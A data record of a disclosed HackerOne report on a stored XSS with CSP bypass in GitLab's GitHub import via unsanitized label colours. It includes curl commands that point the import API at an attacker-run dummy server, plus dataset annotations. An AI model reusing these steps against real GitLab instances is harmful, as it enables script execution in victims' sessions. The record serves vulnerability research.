{
  "reported_to": "GitLab",
  "reported_by": "yvvdwf ",
  "title": "Stored-XSS with CSP-bypass via labels' color",
  "content": "\nGitlab allows to import a project from Github. It imports also the labels whose colors are not sanitized. This leads to Stored-XSS.\nStep to reproduce\nTo reproduce, we need the following prerequisite:\nGithub does not allow neither to create arbitrary label colors. You can find in the attachment a dummy Github server\nA VM/machine to host the dummy server above with an public IP though that gitlab.com can access to.\nI created the dummy server using nodejs, so you need to have also nodejs on the machine\nA Gitlab personal access token. Go here to create a new token with within api scope.\nStep 1: run the dummy server\nCopy the attachment file on your machine and decompress it to any folder, e.g., /tmp/dummy-server\nGo to /tmp/dummy-server then run this command: node ./index.js YOUR_IP YOUR_PORT in which, you should replace IP and PORT with the one you have. For example, sudo node index.js 51.75.74.52 80\nStep 2: trigger Gitlab import\nOpen a new terminal, then run the following command in which:\nYOUR_IP and YOUR_PORT by the values in the previous step\nYOUR_GITLAB_TOKEN is the api token you've created in the pre-requirement\nYOUR_GITLAB_USERNAME is the target namespace you want to import the project to. It can be your username, or a group name\nYOUR_IP and YOUR_PORT by the values in the previous step\nYOUR_GITLAB_TOKEN is the api token you've created in the pre-requirement\nYOUR_GITLAB_USERNAME is the target namespace you want to import the project to. It can be your username, or a group name\nCode 417 Bytes\n1curl -kv \"https://gitlab.com/api/v4/import/github\" \\\n2  --request POST \\\n3  --header \"content-type: application/json\" \\\n4  --header \"PRIVATE-TOKEN: YOUR_GITLAB_TOKEN\" \\\n5  --data '{\n6    \"personal_access_token\": \"ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\",\n7    \"repo_id\": \"523303538\",\n8    \"target_namespace\": \"YOUR_GITLAB_USERNAME\",\n9    \"new_name\": \"xss-on-label-color\",\n10    \"github_hostname\": \"http://YOUR_IP:YOUR_PORT\"\n11}'\nFor example:\nCode 403 Bytes\n1curl -kv \"https://gitlab.com/api/v4/import/github\" \\\n2  --request POST \\\n3  --header \"content-type: application/json\" \\\n4  --header \"PRIVATE-TOKEN: AAAAAAAAAAAAAYYYYabc\" \\\n5  --data '{\n6    \"personal_access_token\": \"ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\",\n7    \"repo_id\": \"523303538\",\n8    \"target_namespace\": \"yvvdwf\",\n9    \"new_name\": \"xss-on-label-color\",\n10    \"github_hostname\": \"http://51.75.74.52:80\"\n11}'\nAfter finishing, you can view the list of the labels of the imported project. You should see an popup created by this js alert(document.domain)\nAn example is available here (private project): https://gitlab.com/yvvdwf/xss-on-label-color/-/labels\nImpact\nStored-XSS with CSP-bypass allows attackers to execute arbitrary actions on behalf of victims at the client side.\nImpact\nStored-XSS with CSP-bypass allows attackers to execute arbitrary actions on behalf of victims at the client side.\n\n",
  "severity": [
    8.7,
    null
  ],
  "bounty": 13950,
  "weaknesses": [
    "Cross-site Scripting (XSS) - Stored"
  ],
  "screenshots": {},
  "disclosed_date": 1676864640,
  "report_url": "https://hackerone.com/reports/1665658",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Set up a dummy GitHub server with Node.js that allows arbitrary label colors and host it on a public IP accessible by GitLab."
    ],
    [
      2,
      "Use a GitLab API token to import a project from the dummy GitHub server, including labels with malicious color values that contain XSS payloads."
    ],
    [
      3,
      "View the imported project's labels in GitLab to trigger the XSS payload, which bypasses CSP protections."
    ]
  ],
  "vuln_description": "GitLab's project import feature from GitHub does not sanitize label colors, allowing stored XSS attacks. By importing a project with malicious label colors, an attacker can execute arbitrary JavaScript in the context of the victim's session, bypassing CSP protections.",
  "reason": "The vulnerability requires setting up a custom GitHub server to bypass GitHub's label color restrictions, understanding GitLab's project import API, and crafting a payload that bypasses CSP. The interaction between these components is non-obvious and requires knowledge of both systems.",
  "new_complexity": "HIGH",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves a stored-XSS via label colors in GitLab when importing from a GitHub project. The methodology described focuses on authentication and authorization (AuthN/AuthZ) bypasses and IDOR vulnerabilities by swapping user sessions and resource IDs within the same application. However, the reported issue is a cross-site scripting (XSS) vulnerability that bypasses CSP, which is a different class of vulnerability not covered by the AuthN/AuthZ testing methodology. The XSS vulnerability does not involve swapping user sessions or resource IDs but rather exploits unsanitized input in label colors during project import.",
    "is_detectable": false
  }
}